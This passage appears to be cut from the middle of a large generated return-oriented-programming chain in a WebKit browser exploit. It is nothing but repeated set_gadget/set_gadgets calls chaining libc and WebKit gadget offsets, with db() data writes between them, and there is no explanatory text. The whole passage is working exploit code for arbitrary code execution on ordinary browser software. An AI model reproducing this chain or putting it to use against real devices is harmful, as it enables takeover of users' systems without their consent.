libc_base+793877, 
ropchain+322320, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+322288, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+322400, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+788575, 
ropchain+399640, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+322536, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+322552, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+322696, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+322664, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+322680, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+322776, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([662384, 0]); 
set_gadget(libc_base+788575,); 
db([662384, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+322928, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+322944, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+322912, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+323024, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+788575, 
ropchain+398496, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+323160, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+323176, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+323320, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+323288, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+323304, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+323400, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([662384, 0]); 
set_gadget(libc_base+788575,); 
db([662384, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+323552, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+323568, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+323536, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+323648, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+788575, 
ropchain+399552, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+323784, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+323800, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+323944, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+323912, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+323928, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+324024, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([662393, 0]); 
set_gadget(libc_base+788575,); 
db([662393, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+324176, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+324192, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+324160, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+324272, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+788575, 
ropchain+398528, 
webkit_base+2997875, 
libc_base+50775, 
libc_base+793877, 
ropchain+324344, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([2, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([28, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+324560, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+393776, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+324632, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967260, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+50775, 
libc_base+793877, 
ropchain+324712, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([2, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([28, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+324928, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+393776, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+325000, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+325144, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+325160, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+325312, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+325344, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+325328, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+325296, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+325440, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+325424, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+792472 
]);
db([8, 0]); 
set_gadget(libc_base+788575,); 
db([8, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1506828, 
libc_base+793877, 
ropchain+325656, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+325672, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+325640, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+325768, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+325752, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+788575, 
ropchain+399000, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965204, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+325896, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965200, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+326008, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965196, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+326120, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+793877, 
ropchain+326176, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+326224, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965196, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+326328, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+326344, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+326496, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+326528, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+326512, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+326480, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+326600, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+326616, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+326712, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+326696, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+326792, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([512, 0]); 
set_gadget(libc_base+788575,); 
db([512, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+326944, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+326960, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+326928, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+327128, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+327144, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+327112, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+327248, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+327296, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+327264, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+327408, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+327400, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+327424, 
ropchain+327440, 
libc_base+811575, 
ropchain+327456, 
libc_base+811575, 
ropchain+330728, 
libc_base+793877, 
ropchain+327496, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965204, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+327600, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+327616, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+327768, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+327800, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+327784, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+327752, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+327896, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+327880, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([2, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([28, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+328144, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+393776, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+328280, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+328296, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+328264, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+328392, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+328376, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+328488, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965208, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+328568, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+328624, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+328704, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965196, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+328808, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+328824, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+328976, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+329008, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+328992, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+328960, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+329168, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+329136, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+329120, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([4, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+329240, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+329256, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+329344, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+329400, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+329472, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+329528, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+329632, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+329648, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+329800, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+329816, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+329784, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+329920, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+329904, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965204, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+330000, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+330048, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965196, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+330152, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+330168, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+330320, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+330352, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+330336, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+330304, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+330448, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+330432, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+330536, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+330592, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965196, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+330672, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+326184, 
libc_base+793877, 
ropchain+330768, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965200, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+330872, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+330888, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+331040, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+331072, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+331056, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+331024, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+331168, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+331152, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+331248, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965204, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+331352, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+331368, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+331520, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+331552, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+331536, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+331504, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+331648, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+331632, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+397904, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+331800, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160240, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+865136, 
libc_base+793877, 
ropchain+331912, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+331984, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+332056, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
